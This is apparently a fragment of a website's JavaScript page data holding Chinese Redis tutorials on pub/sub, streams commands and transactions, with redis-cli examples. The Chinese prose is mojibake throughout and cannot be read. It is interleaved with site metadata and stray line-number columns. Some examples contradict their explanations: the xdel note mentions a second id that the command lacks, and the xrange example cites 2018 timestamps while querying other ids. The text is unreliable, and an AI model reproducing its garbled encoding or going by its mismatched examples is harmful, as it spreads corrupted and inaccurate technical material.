å¯¹æå®çæåºéåæ§è¡ç±»ä¼¼äºéåçå¹¶éè¿ç®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# è®¢é / åå¸\n\n\nsubscribe channel[...] -> è®¢éç»å®çä¸ä¸ªæå¤ä¸ªé¢é\n\nunsubscribe channel[...] -> éè®¢ç»å®çä¸ä¸ªæå¤ä¸ªé¢éï¼å¦ææ§è¡æ¶æ²¡æç»å®ä»»ä½é¢éï¼é£ä¹éè®¢ææé¢é\n\npublish channel message -> åç»å®çé¢éåéæ¶æ¯\n\npsubscribe pattern[...] -> è®¢éä¸ç»å®æ¨¡å¼ç¸å¹éçææé¢é\n\npunsubscribe pattern[...] -> éè®¢ç»å®çæ¨¡å¼ï¼å¦ææ§è¡æ¶æ²¡æç»å®ä»»ä½æ¨¡å¼ï¼é£ä¹éè®¢æææ¨¡å¼ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# redis5 ä¹ streams æ°æ®ç±»å\n\nredis 5.0 å¨æ°çæ°æ®ç±»åï¼streamsï¼å®æ¹æå®å®ä¹ä¸ºï¼ä»¥æ´æ½è±¡çæ¹å¼å»ºæ¨¡æ¥å¿çæ°æ®ç»æãredis ç streams ä¸»è¦æ¯ä¸ä¸ª append only çæ°æ®ç»æï¼è³å°å¨æ¦å¿µä¸å®æ¯ä¸ç§å¨åå­ä¸­è¡¨ç¤ºçæ½è±¡æ°æ®ç±»åï¼åªä¸è¿å®ä»¬å®ç°äºæ´å¼ºå¤§çæä½ï¼ä»¥åææ¥å¿æä»¶æ¬èº«çéå¶ã\n\nå¦æä½ äºè§£ mqï¼é£ä¹å¯ä»¥æ streams å½å mqãå¦æä½ è¿äºè§£ kafkaï¼é£ä¹çè³å¯ä»¥æ streams å½å kafkaã\n\nå¦å¤ï¼è¿ä¸ªåè½æç¹ç±»ä¼¼äº redis ä»¥åç pub/subï¼ä½æ¯ä¹æåºæ¬çä¸åï¼\n\n * streams æ¯æå¤ä¸ªå®¢æ·ç«¯ï¼æ¶è´¹èï¼ç­å¾æ°æ®ï¼linux ç¯å¢å¼å¤ä¸ªçªå£æ§è¡ xread å³å¯æ¨¡æï¼ï¼å¹¶ä¸æ¯ä¸ªå®¢æ·ç«¯å¾å°çæ¯å®å¨ç¸åçæ°æ®ã\n\n * pub/sub æ¯åéå¿è®°çæ¹å¼ï¼å¹¶ä¸ä¸å­å¨ä»»ä½æ°æ®ï¼è streams æ¨¡å¼ä¸ï¼æææ¶æ¯è¢«æ éæè¿½å å¨ streams ä¸­ï¼é¤éç¨äºæ¾ç¤ºæ§è¡å é¤ï¼xdelï¼ã\n\n * streams ç consumer groups ä¹æ¯ pub/sub æ æ³å®ç°çæ§å¶æ¹å¼ã\n\n\n# streams æ°æ®ç»æ\n\nstreams æ°æ®ç»ææ¬èº«éå¸¸ç®åï¼ä½æ¯ streams ä¾ç¶æ¯ redis å°ç®åä¸ºæ­¢æå¤æçç±»åï¼å¶åå æ¯å®ç°çä¸äºé¢å¤çåè½ï¼ä¸ç³»åçé»å¡æä½åè®¸æ¶è´¹èç­å¾çäº§èå å¥å° streams çæ°æ°æ®ãå¦å¤è¿æä¸ä¸ªç§°ä¸º consumer groups (æ¶è´¹ç») çæ¦å¿µï¼è¿ä¸ªæ¦å¿µæåç± kafka æåºï¼redis æä¸ä¸ªç±»ä¼¼å®ç°ï¼å kafka ç consumer groups çç®çæ¯ä¸æ ·çï¼åè®¸ä¸ç»å®¢æ·ç«¯åè°æ¶è´¹ç¸åçä¿¡æ¯æµï¼\n\n\n# streams åºç¡\n\nä¸ºäºçè§£ streams çç®çï¼ä»¥åå¦ä½ä½¿ç¨å®ï¼æä»¬åå¿½ç¥æææé«çº§ç¹æ§ï¼åªææ³¨æåæ¾å¨æ°æ®ç»ææ¬èº«ï¼ä»¥åé£äºæä½åè®¿é® streams çå½ä»¤ãè¿åºæ¬ä¸ä¹æ¯å¤§å¤æ°å¶ä» redis æ°æ®ç±»åå±æçé¨åï¼ä¾å¦ listsï¼setsï¼sorted sets ç­ãç¶èéè¦æ³¨æçæ¯ï¼lists ä¹æä¸ä¸ªæ´å¤æçé»å¡å¼ç apiï¼ä¾å¦ blpopï¼brpop ç­ãstreams è¿æ¹ä¾¿ç api ä¹æ²¡ä»ä¹ä¸åï¼åªæ¯æ´å¤æï¼æ´å¼ºå¤§ï¼æ´çé¼ï¼åï¼ï¼\n\n\n# streams å½ä»¤\n\nåºè¯ä¸å¤è¯´ï¼åä¸æç©ç©è¿ä¸ªå¨æ°çæ°æ®ç±»åãstreams è¿ä¸ªæ°æ®ç±»åå¯¹åºæå¦ä¸ 13 ä¸ªæä½å½ä»¤ï¼ææå½ä»¤é½ä»¥ "x" å¼å¤´ï¼\nxadd\n\n * ç¨æ³ï¼xadd key id field string [field string â¦]\n\n * æ­£å¦å¶åï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥æ·»å çï¼ç» streams è¿½å ï¼appendï¼åé¢æå°è¿ï¼streams ä¸»è¦æ¯ä¸ä¸ª append only çæ°æ®ç»æï¼ä¸ä¸ªæ°ç entryï¼å java éç map ç±»ä¼¼ï¼redis éç streams ä¸­çæ°æ®ä¹ç§°ä¸º entryï¼ã\n\n * keyï¼çå«ä¹å°±æ¯åä¸ç±»å streams çåç§°ï¼\n\n * id: streams ä¸­ entry çå¯ä¸æ è¯ç¬¦ï¼å¦ææ§è¡ xadd å½ä»¤æ¶ï¼ä¼ å¥æå·ï¼*ï¼ï¼é£ä¹ï¼id ä¼èªå¨çæï¼ä¸èªå¨çæç id ä¼å¨æ§è¡ xadd åè¿åï¼é»è®¤çæç id æ ¼å¼ä¸º millisecondstime+sequencenumberï¼å³å½åæ¯«ç§çº§å«çæ¶é´æ³å ä¸ä¸ä¸ªèªå¢åºå·å¼ï¼ä¾å¦ "1540013735401-0"ãå¹¶ä¸æ§è¡ xadd æ¶ï¼ä¸æ¥åå°äºæç­äºä¸ä¸æ¬¡æ§è¡ xadd ç idï¼å¦åä¼æ¥éï¼err the id specified in xadd is equal or smaller than the target stream top itemï¼\n\n * field&stringï¼æ¥ä¸æ¥å°±æ¯è¥å¹²ç» field stringãå¯ä»¥æå®çè§£ä¸ºè¡¨ç¤ºå±æ§ç json ä¸­ç key-valueãä¾å¦ï¼æä¸ streams ç key å½åä¸º userinfoï¼ä¸æä¸ªç¨æ·ä¿¡æ¯ä¸º {"username":"afei", "password":"123456"}ï¼é£ä¹æ§è¡ xadd å½ä»¤å¦ä¸ï¼\n\n127.0.0.1:6379> xadd userinfo * name afei password 123456\n"1594456377383-0"\n127.0.0.1:6379> \n\n\n1\n2\n3\n\n\nç±äºå½ä»¤ä¸­ id å­æ®µçå¼æ¯ * ï¼æä»¥èªå®çæ idï¼1594456377383-0 å°±æ¯èªå¨çæç idã xadd å½ä»¤ä¹æ¯ææ¾ç¤ºæå® idï¼ä¾å¦ï¼xadd key 0-2 field stringã\n\néè¦æ³¨æçæ¯ï¼id çæ¶é´æ³é¨åæ¯é¨ç½² redis æå¡å¨çæ¬å°æ¶é´ï¼å¦æåçæ¶éåæ¨ä¼æä¹æ ·ï¼å¦æåçæ¶éåæ¨ï¼çæç id çæ¶é´æ³é¨åå°±æ¯åæ¨åçæ¶é´ï¼ç¶åå ä¸è¿ä¸ªæ¶é´çéå¢åºåå·ãä¾å¦å½åæ¶é´æ³ 1540014082060ï¼ç¶åè¿æ¶ååçäºæ¶éåæ¨ï¼ä¸åæ¨ 5msï¼é£ä¹æ¶é´æ³å°±æ¯ 1540014082055ãåè®¾ä»¥åå·²ç»çæäº 1540014082055-0ï¼1540014082055-1ï¼é£ä¹è¿æ¬¡ç±äºæ¶éåæ¨ï¼çæç id å°±æ¯ 1540014082055-2ãæä»¥åè®¸èªå¨çæç id å¨åçæ¶éåæ¨æ¶å°äºä¸æ¬¡ç idï¼ä½æ¯ä¸åè®¸æ¾ç¤ºæå®ä¸ä¸ªå°äºä¸æ¬¡ç idã\n\nå¦ææä»¬ä»¥ç¸åç key æå¥ä¸éï¼ä»ä¸ä¼åæ®éç key-value ä¸æ ·åæ¿æ¢ï¼èæ¯å¨ç¸å key ç»´æ¤è¿ä¸ä¸ªåè¡¨ã\n\nxdel\n\n * ç¨æ³ï¼xdel key id [id â¦]\n   å xadd ç¸åï¼è¿æ¯å½ä»¤ç¨æ¥ä» streams ä¸­å é¤è¥å¹²ä¸ª entryï¼å¹¶ä¸ä¼è¿åå®éå é¤æ°ï¼è¿ä¸ªå é¤æ°å¯è½ååæ° id ä¸ªæ°ä¸ç­ï¼å ä¸ºæäº id è¡¨ç¤ºçæ¶æ¯å¯è½ä¸å­å¨ãæ§è¡å½ä»¤å¦ä¸ï¼ç¬¬äºä¸ªåæ° id æ¯ä¸å­å¨çï¼æä»¥ xdel çè¿åç»ææ¯ 1ï¼\n\n127.0.0.1:6379> xdel userinfo 1594456377383-0\n(integer) 1\n\n\n1\n2\n\n\nxlen\n\n * ç¨æ³ï¼xlen key\n   å¾å¥½çè§£ï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥è¿åç¸å key çæ°éï¼ä¸é¢åè¯´ç¸å key æ¯ä¸ä¼è¦ççï¼æ¯ç»´æ¤äºä¸ä¸ªåè¡¨ï¼æä»¥è¿ä¸ªæ¯ç¸å key åè¡¨ç sizeãæ§è¡å¦ä¸ï¼\n\n127.0.0.1:6379> xadd user * name zhangsan\n"1594457206541-0"\n127.0.0.1:6379> xlen user\n(integer) 1\n127.0.0.1:6379> xadd user * name zhangsan sex 0 \n"1594457274424-0"\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> xadd user * name zhangsan sex 0 password 123\n"1594457287981-0"\n127.0.0.1:6379> xlen user\n(integer) 3\n127.0.0.1:6379> xdel user 1594457287981-0\n(integer) 1\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# streams ä¸ç§æ¥è¯¢æ¨¡å¼\n\nredis æä¾äºä¸ç§æ¥è¯¢ streams æ°æ®çæ¨¡å¼ï¼\n\n * èå´æ¥è¯¢ï¼å ä¸º streams çæ¯ä¸ª entryï¼å¶é»è®¤çæç id æ¯åºäºæ¶é´ä¸éå¢çï¼\n\n * çå¬æ¨¡å¼ï¼ç±»æ¯ linux ä¸­ç tailf å½ä»¤ï¼å®æ¶æ¥æ¶æ°å¢å å° streams ä¸­ç entryï¼ä¹æç¹åä¸ä¸ªæ¶æ¯ç³»ç»ï¼äºå®ä¸ç¬èè®¤ä¸ºå®å°±æ¯åé´äº kafkaï¼ï¼\n\n * æ¶è´¹èç»ï¼å³ consumer groupsï¼ç¹æ®ççå¬æ¨¡å¼ãä»ä¸ä¸ªæ¶è´¹èçè§åº¦æ¥ç streamsï¼ä¸ä¸ª streams è½è¢«ååºå°å¤ä¸ªå¤çæ¶æ¯çæ¶è´¹èï¼å¯¹äºä»»æä¸æ¡æ¶æ¯ï¼åä¸ä¸ªæ¶è´¹èç»ä¸­åªæä¸ä¸ªæ¶è´¹èå¯ä»¥å¤çï¼å kafka çæ¶è´¹èç»å®å¨ä¸æ ·ï¼ãè¿æ ·è¿è½å¤æ¨ªåæ©å®¹æ¶è´¹èï¼ä»èæåå¤çæ¶æ¯çè½åï¼èä¸éè¦åªè®©æè®©ä¸ä¸ªæ¶è´¹èå¤çæææ¶æ¯ã\n\nxrange\n\n * ç¨æ³ï¼xrange key start end [count count]\n   è¿ä¸ªå½ä»¤å±äºç¬¬ 1 ç§æ¨¡å¼ï¼å³åºäºèå´æ¥è¯¢ãè¿ä¸ªå½ä»¤ç¨æ¥è¿å streams æä¸ªé¡ºåºèå´ä¸çåç´ ï¼start åæ°æ¯æ´å°ç idï¼end åæ°æ¯æ´å¤§ç idãæä¸¤ä¸ªç¹æ®ç id ç¨ç¬¦å· "-" å "+" è¡¨ç¤ºï¼ç¬¦å· "-" è¡¨ç¤ºæå°ç idï¼ç¬¦å· "+" è¡¨ç¤ºæå¤§ç idï¼\n\n127.0.0.1:6379> xrange user 1540014096298-0 1594457274424-0\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n127.0.0.1:6379> xrange user - +\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n3) 1) "1594458356220-0"\n   2) 1) "name"\n      2) "wu"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nxrange è¿è½å®ç°éåæä¸ªèå´åºé´çåè½ï¼ä¾å¦ææ³éå 2018-10-20 å·æ°å¢çç¨æ·ä¿¡æ¯ãé¦åå¾å° 2018-10-20 00:00:00 å¯¹åºçæ¶é´æ³ä¸º 1539964800000ï¼åå¾å° 2018-10-20 23:59:59 å¯¹åºçæ¶é´æ³ä¸º 1540051199000ï¼ç¶åæ§è¡å¦ä¸å½ä»¤ï¼\n\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 1\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 2\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nxrevrange\n\n * ç¨æ³ï¼xrevrange key end start [count count]\n   è¿ä¸ªå½ä»¤ä¹å±äºç¬¬ 1 ç§æ¨¡å¼ï¼ä¸å xrange ç¸åï¼è¿åä¸ä¸ªéåºèå´ãend åæ°æ¯æ´å¤§ç idï¼start åæ°æ¯æ´å°ç id\n\nxread\n\n * ç¨æ³ï¼xread [count count] [block milliseconds] streams key [key â¦] id [id â¦]\n   å¾ææ¾ï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥å®ç°ç¬¬ 2 ä¸ªæ¨¡å¼ï¼å³çå¬æ¨¡å¼ãå¶ä½ç¨æ¯è¿å streams ä¸­ä»æ¥æ²¡æè¯»åçï¼ä¸æ¯åæ° id æ´å¤§çåç´ ã\n   è¿éæå¼äºä¸¤ä¸ªçªå£æµè¯ï¼ä¸ç¬¬ä¸ä¸ªæ²¡æåæ°å¢ï¼ç¬¬äºä¸ªåäºæ°å¢.\n\n127.0.0.1:6379> xread count 10 block 60000 streams user 1594458356220-0\n\n\n\n(nil)\n(60.02s)\n\n\n1\n2\n3\n4\n5\n6\n\n\n127.0.0.1:6379> xread count 10 block 60000 streams user 1594458356220-0\n1) 1) "user"\n   2) 1) 1) "1594458985980-0"\n         2) 1) "name"\n            2) "ceshi"\n(13.37s)\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä½¿ç¨ xread ä¼é»å¡ç¹å®æ¶é´ï¼ç­å¾æ¯æ id å¤§çæ°æ®ï¼å¦æä½¿ç¨æå° id è¿è¡æµè¯ï¼ä¼è· xrange user - + æææ¯ä¸æ ·çã\n\næ³¨æï¼block ä¸º 0 è¡¨ç¤ºä¸è´ç­å¾ç¥éææ°çæ°æ®ï¼å¦åæ°¸è¿ä¸ä¼è¶æ¶ãå¹¶ä¸ id çå¼æä»¬ç¨ç¹æ®å­ç¬¦ $ è¡¨ç¤ºï¼è¿ä¸ªç¹æ®å­ç¬¦è¡¨ç¤ºæä»¬åªè·åææ°æ·»å çæ¶æ¯ã\n\n127.0.0.1:6379> xread count 10 block 0 streams user $\n\n\n\n\n1\n2\n3\n\n\nxread è¿æ¯æåæ¶çå¬å¤ä¸ª streams\n\n127.0.0.1:6379> xread block 0 streams user_01 user_02 user_03 user_04  $ $ $ $\n\n\n\n\n\n1\n2\n3\n4\n\n\nxread é¤äº count å blockï¼æ²¡æå¶ä»éé¡¹äºãææ xread æ¯ä¸ä¸ªéå¸¸åºæ¬çå½ä»¤ãæ´å¤é«çº§ç¹æ§å¯ä»¥å¾ä¸çæ¥ä¸æ¥è¦ä»ç»ç xreadgroupã\n\nxreadgroup\n\n * ç¨æ³ï¼xreadgroup group group consumer [count count] [block milliseconds] streams key [key â¦] id [id â¦]\n   å¾ææ¾ï¼è¿å°±æ¯ç¬¬ä¸ç§æ¨¡å¼ï¼æ¶è´¹èç»æ¨¡å¼ã\n * å¦æä½ äºè§£ kafka çæ¶è´¹èç»ï¼é£ä¹ä½ å°±ä¹äºè§£äº streams çæ¶è´¹èç»ãå¦æä¸äºè§£ä¹æ²¡å³ç³»ï¼ç¬èç®åè§£éä¸ä¸ï¼åè®¾æä¸ä¸ªæ¶è´¹è c1ï¼c2ï¼c3ãå¨ streams ä¸­æ»è®¡æ 7 æ¡æ¶æ¯ï¼1ï¼ 2ï¼ 3ï¼ 4ï¼ 5ï¼ 6ï¼ 7ï¼é£ä¹æ¶è´¹å³ç³»å¦ä¸æç¤ºï¼\n   1 -> c1\n   2 -> c2\n   3 -> c3\n   4 -> c1\n   5 -> c2\n   6 -> c3\n   7 -> c1\n * æ¶è´¹èç»å·å¤å¦ä¸å ä¸ªç¹ç¹ï¼\n   \n   * åä¸ä¸ªæ¶æ¯ä¸ä¼è¢«æéå°ä¸ä¸ªæ¶è´¹èç»ä¸çå¤ä¸ªæ¶è´¹èï¼åªå¯è½æ¯ä¸ä¸ªæ¶è´¹èã\n   \n   * åä¸ä¸ªæ¶è´¹èç»ä¸ï¼æ¯ä¸ªæ¶è´¹èé½æ¯å¯ä¸çï¼éè¿å¤§å°åææçåå­åºåã\n   \n   * æ¶è´¹èç»ä¸­çæ¶è´¹èè¯·æ±çæ¶æ¯ï¼ä¸å®æ¯æ°çï¼ä»æ¥æ²¡ææéè¿çæ¶æ¯ã\n   \n   * æ¶è´¹ä¸ä¸ªæ¶æ¯åï¼éè¦ç¨å½ä»¤ï¼xackï¼ç¡®è®¤ï¼æææ¯è¯´ï¼è¿æ¡æ¶æ¯å·²ç»ç»æåå¤çãæ­£å ä¸ºå¦æ­¤ï¼å½è®¿é® streams çåå²æ¶æ¯æ¶ï¼æ¯ä¸ªæ¶è´¹èåªè½çå°æéç»å®èªå·±çæ¶æ¯ã\n\nxack\n\n * ç¨æ³ï¼xack key group id [id â¦]\n * è¿æ¯æ¶è´¹èç»ç¸å³çå¦ä¸ä¸ªéè¦çå½ä»¤ãæ è®°ä¸ä¸ªå¤çä¸­çæ¶æ¯ä¸ºå·²è¢«æ­£ç¡®å¤çï¼å¦æ­¤ä¸æ¥ï¼è¿æ¡æ¶æ¯å°±ä¼è¢«ä»æ¶è´¹èç»ç pending æ¶æ¯éåä¸­å é¤ï¼ç±»ä¼¼ mq ä¸­ç ackã\n\nxgroup\n\n * ç¨æ³ï¼xgroup create key groupname id\n * è¿ä¹æ¯æ¶è´¹èç»çä¸ä¸ªéè¦å½ä»¤ï¼è¿ä¸ªå½ä»¤ç¨æ¥ç®¡çæ¶è´¹èç»ï¼ä¾å¦åå»ºï¼å é¤ç­ã\n   xreadgroupï¼xackï¼xgroup ä¸ç§å½ä»¤ææäºæ¶è´¹èç»ç¸å³çæä½å½ä»¤ã\n   ç®å xgroup create ç streams å¿é¡»æ¯ä¸ä¸ªå­å¨ç streamsï¼å¦åä¼æ¥éã\n   åå»ºä¸ä¸ªæ¶è´¹ç»\n\n127.0.0.1:6379> xgroup create user grp-afei $\nok\n\n\n1\n2\n',charsets:{cjk:!0}},{title:"Redisäºå¡ä»ç»",frontmatter:{title:"Redisäºå¡ä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1603",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1603.Redis%E4%BA%8B%E5%8A%A1%E4%BB%8B%E7%BB%8D.html",relativePath:"04.ä¸­é´ä»¶/03.redis/1603.Redisäºå¡ä»ç».md",key:"v-9f012bb0",path:"/Redis/1603/",headers:[{level:2,title:"redisäºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼",slug:"redisäºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼",normalizedTitle:"redis äºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼",charIndex:485},{level:2,title:"redisäºå¡ç¸å³å½ä»¤",slug:"redisäºå¡ç¸å³å½ä»¤",normalizedTitle:"redis äºå¡ç¸å³å½ä»¤",charIndex:904}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"redisäºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼ redisäºå¡ç¸å³å½ä»¤",content:"Redis æ¯æäºå¡ï¼ä½åªæ¯æäºå¡ä¸­ (A-> åå­æ§ C-> ä¸è´æ§ I-> éç¦»æ§ D-> æä¹æ§) A å Iï¼ä½¿ç¨ Redis äºå¡è¦æ³¨æä»¥ä¸ä¸¤ç¹ï¼\n1. å¨ä¸ä¸ª Redis äºå¡ä¸­ï¼Redis è¦ä¹æ§è¡å¶ä¸­çææå½ä»¤ï¼è¦ä¹ä»ä¹é½ä¸æ§è¡ãå æ­¤ï¼Redis äºå¡è½å¤ä¿è¯åå­æ§ã\n2.Redis ä¼å°ä¸ä¸ªäºå¡ä¸­çææå½ä»¤åºååï¼ç¶åæé¡ºåºæ§è¡ãRedis ä¸å¯è½å¨ä¸ä¸ª Redis äºå¡çæ§è¡è¿ç¨ä¸­æå¥æ§è¡å¦ä¸ä¸ªå®¢æ·ç«¯ååºçè¯·æ±ãè¿æ ·ä¾¿è½ä¿è¯ Redis å°è¿äºå½ä»¤ä½ä¸ºä¸ä¸ªåç¬çéç¦»æä½æ§è¡ã\n\næä»¬æ­£å¸¸çè§å¿µè®¤ä¸ºï¼å½æ§è¡æä¸ä¸ªäºå¡ä¸­ï¼ææ¥éå°±ä¼åæ»æ°æ®ï¼Redis å¹¶ä¸æ¯è¿æ ·å¤ççã é¦åæç¡®éè¿° Redis æ¯æ²¡æåæ»çãç¶åæä»¬æ¢è®¨ä¸ç´æ§çé®é¢ï¼Redis ä¸ç´æ§çå¤çæ¹å¼æ¯ï¼å¦æè¯­æ³ä¸æç¡®çåºç° ERRORï¼ä¼è®¤ä¸ºæ´ä¸ªäºå¡å°±æ¯ ERRORï¼ä½æ°æ®ä¸åºç° ERRORï¼å¶ä½å½ä»¤è¿æ¯ä¼æåã ä»¥ä¸æ¯è¯­æ³åºéï¼è¿ä¸ªäºå¡ä¹å°±æ¯éè¯¯çï¼å¯æ ä¼æ­¢çé®å¥å½ä»¤ï¼ä½é½ä¸ä¼æåã\n\n\n\nä»¥ä¸æ¯ï¼æ°æ®éè¯¯ï¼æéå¤ç key åºç°ï¼ä½å¹¶ä¸å½±åå¶ä½å½ä»¤çæä½ã\n\n\n\n\n# redis äºå¡ç½ç»ä¸­æ­æèæå¡åæ­¢å®æºçä¿®å¤æ¹å¼\n\nå½æä¸ªå®¢æ·ç«¯æ­£å¨æ§è¡ä¸æ¬¡äºå¡æ¶ï¼å¦æå®å¨è°ç¨ MULTI å½ä»¤ä¹åå°±ä» Redis æå¡ç«¯æ­å¼è¿æ¥ï¼é£ä¹å°±ä¸ä¼æ§è¡äºå¡ä¸­çä»»ä½æä½ï¼ç¸åï¼å¦æå®å¨è°ç¨ EXEC å½ä»¤ä¹åæä» Redis æå¡ç«¯æ­å¼è¿æ¥ï¼é£ä¹å°±ä¼æ§è¡äºå¡ä¸­çæææä½ãå½ Redis ä½¿ç¨åªå¢æä»¶ï¼AOFï¼Append-only Fileï¼æ¶ï¼Redis è½å¤ç¡®ä¿ä½¿ç¨ä¸ä¸ªåç¬ç write (2) ç³»ç»è°ç¨ï¼è¿æ ·ä¾¿è½å°äºå¡åå¥ç£çã\n\nå¦æ Redis æå¡å¨å®æºï¼æèç³»ç»ç®¡çåä»¥æç§æ¹å¼åæ­¢ Redis æå¡è¿ç¨çè¿è¡ï¼é£ä¹ Redis å¾æå¯è½åªæ§è¡äºäºå¡ä¸­çä¸é¨åæä½ãRedis å°ä¼å¨éæ°å¯å¨æ¶æ£æ¥ä¸è¿°ç¶æï¼ç¶åéåºè¿è¡ï¼å¹¶ä¸è¾åºæ¥éä¿¡æ¯ã\n\nä½¿ç¨ redis-check-aof å·¥å·å¯ä»¥ä¿®å¤ä¸è¿°çåªå¢æä»¶ï¼è¿ä¸ªå·¥å·å°ä¼ä»ä¸è¿°æä»¶ä¸­å é¤æ§è¡ä¸å®å¨çäºå¡ï¼è¿æ · Redis æå¡å¨æè½åæ¬¡å¯å¨ã\n\n\n# redis äºå¡ç¸å³å½ä»¤\n\nMULTI -> ç¨äºæ è®°äºå¡åçå¼å§ãRedis ä¼å°åç»­çå½ä»¤éä¸ªæ¾å¥éåä¸­ï¼ç¶åæè½ä½¿ç¨ EXEC å½ä»¤åå­åå°æ§è¡è¿ä¸ªå½ä»¤åºåãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ OKã\n\nEXEC -> å¨ä¸ä¸ªäºå¡ä¸­æ§è¡ææååæ¾å¥éåçå½ä»¤ï¼ç¶åæ¢å¤æ­£å¸¸çè¿æ¥ç¶æãå½ä½¿ç¨ WATCH å½ä»¤æ¶ï¼åªæå½åçæ§çé®æ²¡æè¢«ä¿®æ¹æ¶ï¼EXEC å½ä»¤æä¼æ§è¡äºå¡ä¸­çå½ä»¤ï¼è¿ç§æ¹å¼å©ç¨äºæ£æ¥åè®¾ç½®ï¼CASï¼çæºå¶ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªæ°ç»ï¼å¶ä¸­çæ¯ä¸ªåç´ åå«æ¯åå­åäºå¡ä¸­çæ¯ä¸ªå½ä»¤çè¿åå¼ã å½ä½¿ç¨ WATCH å½ä»¤æ¶ï¼å¦æäºå¡æ§è¡ä¸­æ­¢ï¼é£ä¹ EXEC å½ä»¤å°±ä¼è¿åä¸ä¸ª Null å¼ã\n\nDISCARD -> æ¸é¤ææååå¨ä¸ä¸ªäºå¡ä¸­æ¾å¥éåçå½ä»¤ï¼ç¶åæ¢å¤æ­£å¸¸çè¿æ¥ç¶æãå¦æä½¿ç¨äº WATCH å½ä»¤ï¼é£ä¹ DISCARD å½ä»¤å°±ä¼å°å½åè¿æ¥çæ§çææé®åæ¶çæ§ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ OKã\n\n\n\nWATCH -> å½æä¸ªäºå¡éè¦ææ¡ä»¶æ§è¡æ¶ï¼å°±è¦ä½¿ç¨è¿ä¸ªå½ä»¤å°ç»å®çé®è®¾ç½®ä¸ºåçæ§çãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ OKãå¯¹äºæ¯ä¸ªé®æ¥è¯´ï¼æ¶é´å¤æåº¦æ»æ¯ O (1)ã\n\nä»¥ä¸æ¼ç¤ºäº watch ä¹è§é çç¤ºä¾ï¼(1) å½ä¸ä¸ªå®¢æ·ç«¯ (A) å¯¹ä¸ä¸ªåé (a) è¿è¡äºçå¬æ­¤æ¶ a = 3 å¹¶å¼å¯äºäºå¡ï¼å¦ä¸ä¸ªå®¢æ·ç«¯ (B) æ¹åäº a çå¼ a = 4ï¼é£ä¹ (A) å®¢æ·ç«¯æ§è¡å®äºå¡åï¼exec ä¼è¿å nil (null) ï¼(2) å¦ææ²¡æç«äºï¼åæ­£ç¡®æ§è¡ã\n\n\n\n\n\nwatch ä¸å®æ¯åäºå¡ä¸èµ·ä½¿ç¨æææã\n\nUNWATCH -> æ¸é¤ææååä¸ºä¸ä¸ªäºå¡çæ§çé®ãå¦æä½ è°ç¨äº EXEC æ DISCARD å½ä»¤ï¼é£ä¹å°±ä¸éè¦æå¨è°ç¨ UNWATCH å½ä»¤ãè¿ä¸ªå½ä»¤çè¿åå¼æ¯ä¸ä¸ªç®åçå­ç¬¦ä¸²ï¼æ»æ¯ OKã",normalizedContent:"redis æ¯æäºå¡ï¼ä½åªæ¯æäºå¡ä¸­ (a-> åå­æ§ c-> ä¸è´æ§ i-> éç¦»æ§ d-> æä¹æ§) a å iï¼ä½¿ç¨ redis äºå¡è¦æ³¨æä»¥ä¸ä¸¤ç¹ï¼\n1. å¨ä¸ä¸ª redis äºå¡ä¸­ï¼redis è¦ä¹æ§è¡å¶ä¸­çææå½ä»¤ï¼è¦ä¹ä»ä¹é½ä¸æ§è¡ãå æ­¤ï¼redis äºå¡è½å¤ä¿è¯åå­æ§ã\n2.redis ä¼å°ä¸ä¸ªäºå¡ä¸­çææå½ä»¤åºååï¼ç¶åæé¡ºåºæ§è¡ãredis ä¸å¯è½å¨ä¸ä¸ª redis äºå¡çæ§è¡è¿ç¨ä¸­æå¥æ§è¡å¦ä¸ä¸ªå®¢æ·ç«¯ååºçè¯·æ±ãè¿æ ·ä¾¿è½ä¿è¯ redis 